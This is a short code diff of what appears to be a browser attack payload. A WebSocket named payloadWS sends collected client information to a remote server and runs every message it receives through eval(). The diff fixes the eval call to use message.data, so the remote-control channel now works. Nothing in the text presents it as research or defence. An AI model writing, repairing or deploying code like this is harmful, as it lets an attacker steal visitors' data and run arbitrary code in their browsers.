@@ -13,11 +13,11 @@ async function collectClientInfo() {
 }
 
 payloadWS.onopen = function(){
-    collectClientInfo().then(info => {
-        payloadWS.send(JSON.stringify(info))
-    });
+  collectClientInfo().then(info => {
+      payloadWS.send(JSON.stringify(info))
+  });
 }
 
 payloadWS.onmessage = function(message){
-    eval(message)
+  eval(message.data)
 }
